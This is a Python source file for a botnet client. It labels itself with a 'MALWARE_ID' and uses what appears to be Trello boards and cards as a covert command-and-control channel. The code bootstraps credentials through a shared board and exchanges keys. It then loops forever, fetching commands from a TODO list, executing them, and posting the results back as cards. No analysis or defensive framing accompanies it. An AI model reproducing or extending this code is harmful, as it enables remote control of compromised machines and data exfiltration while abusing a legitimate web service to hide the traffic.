import api_utils as utils
import time
import json
import random
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import language


MALWARE_ID = random.randint(1, 10000000)
ACCOUNT_KEY = ''
ACCOUNT_TOKEN = ''
BOT_BOOTSTRAP_CREDS_LIST = "bootstrap.json"


def bootstrap():
    global ACCOUNT_KEY, ACCOUNT_TOKEN
    # get bootstrap credentials
    with open(BOT_BOOTSTRAP_CREDS_LIST, 'r') as f:
        bootstrap_creds = json.load(f)
    BOOTSTRAP_KEY = bootstrap_creds['key']
    BOOTSTRAP_TOKEN = bootstrap_creds['token']
    # post request on bootstrap for new account
    list_name = utils.BOOTSTRAP_LIST_NAME_PREFIX+str(MALWARE_ID)
    # opens new list on bootstrap board
    new_list_id = utils.create_list_and_get_id(
        BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, list_name, utils.BOT_BOOTSTRAP_BOARD_ID)
    if not new_list_id:
        print(
            "ERROR: could not create list on bootstrap board. err code: " + str(new_list_id))
        return utils.BOOTSTRAP_ERROR
    # open card with request on the new list
    if utils.create_card(BOOTSTRAP_KEY, BOOTSTRAP_TOKEN,
                         new_list_id, utils.CRED_REQ_CARD_NAME) < 0:
        print("ERROR: could not request credentials on bootstrap board")
        return utils.BOOTSTRAP_ERROR

    # wait for the server to create a list on the server bootstrap board
    read_list_id = None
    while not read_list_id:
        lists = utils.get_lists_in_board(
            BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, utils.SERVER_BOOTSTRAP_BOARD_ID)
        for l in lists:
            if l['name'] == list_name:
                read_list_id = l['id']
        if not read_list_id:
            time.sleep(10)
    # exchange keys
    key = utils.exchange_keys(
        BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, new_list_id, read_list_id)
    if key is None:
        print("ERROR: could not exchange keys")
        return
    # receive new account from the bootstrap board
    # waits until new card appears on new list containing the cred.
    # TODO: description is as expected
    cred_card_id = None
    while not cred_card_id:
        cards = utils.get_cards_in_list(
            BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, read_list_id)
        if len(cards) == 0:
            print("ERROR: could not get cards in bootstrap list")
            return utils.BOOTSTRAP_ERROR
        for card in cards:
            if card['name'] == utils.CRED_ANS_CARD_NAME:
                my_key, my_token = utils.get_creds_from_card(
                    BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, card['id'], key)
                if not my_key or not my_token:
                    print(
                        "ERROR: invalid credentials received from bootstrap. looking for new...")
                    continue
                cred_card_id = card['id']
        if not cred_card_id:
            time.sleep(10)

    # get creds from card
    ACCOUNT_KEY, ACCOUNT_TOKEN = my_key, my_token
    # delete bootstrap creds from file and ram
    bootstrap_creds = None
    BOOTSTRAP_KEY = None
    BOOTSTRAP_TOKEN = None
    # TODO delete the bootstrap request list
    # if utils.archive_list(BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, new_list_id) < 0:
    #     print("ERROR: could not archive bootstrap list")
    #     return utils.BOOTSTRAP_ERROR
    return 0


def exec_command(command):
    cmd, *args = command.split()
    try:
        return language.commands[cmd](*args)
    except KeyError:
        print("ERROR: unknown command: " + cmd)
        return "error " + command


def main():
    # get the token and key from the bootstrap
    print("------------------starting---------------------")
    print("malware id: " + str(MALWARE_ID))
    print("----------------bootstrapping-------------------")
    if bootstrap() < 0:
        print("ERROR: could not bootstrap. exiting...")
        return
    print("------------------got creds---------------------")
    print("------------------moving to new account------------------")
    boards = utils.get_all_boards(ACCOUNT_KEY, ACCOUNT_TOKEN)
    # for now, asssume we only have one board and it contains one list for communication
    if len(boards) == 0:
        print("ERROR: no bot boards found. exiting...")
        return
    if len(boards) > 1:
        print("ERROR: more than one bot board found. exiting...")
        return

    board_id = boards[0]['id']

    todo_list_id = utils.get_list_id(
        ACCOUNT_KEY, ACCOUNT_TOKEN, utils.TODO_LIST_NAME, board_id)
    done_list_id = utils.get_list_id(
        ACCOUNT_KEY, ACCOUNT_TOKEN, utils.DONE_LIST_NAME, board_id)
    if not todo_list_id or not done_list_id:
        print("ERROR: TODO or DONE list weren't found. exiting...")
        return

    finished_command_ids = []
    while True:
        cards = utils.get_cards_in_list(
            ACCOUNT_KEY, ACCOUNT_TOKEN, todo_list_id)
        for card in cards:
            # the command id is the first part of the card name
            if utils.COMMAND_TOKEN_SEPERATOR not in card['name']:
                print("ERROR: invalid card name: " + card['name'])
                continue
            command_id = card['name'].split(utils.COMMAND_TOKEN_SEPERATOR)[0]
            if command_id not in finished_command_ids:
                command_card_id = card['id']
                # the command is in the description of the card
                command = utils.get_command_from_card(
                    ACCOUNT_KEY, ACCOUNT_TOKEN, command_card_id)
                if not command:
                    print(
                        "ERROR: could not get command from card. name: " + card['name'])
                    continue
                print("executing command: " + command)
                result = exec_command(command)
                print("result: " + result)
                if utils.create_card(ACCOUNT_KEY, ACCOUNT_TOKEN,
                                     done_list_id, command_id + utils.COMMAND_TOKEN_SEPERATOR +
                                     utils.COMMAND_RESP_NAME, desc=result) < 0:
                    print(
                        "ERROR: could not create response card for command: " + command)
                    continue

                # TODO: move card to done after finishing
                # if utils.move_card_to_list(ACCOUNT_KEY, ACCOUNT_TOKEN, command_card_id, done_list_id) < 0:
                #     print("ERROR: could not move command card to done. name: " + card['name'])
                #     continue
                finished_command_ids.append(command_id)
        time.sleep(10)


if __name__ == '__main__':
    main()
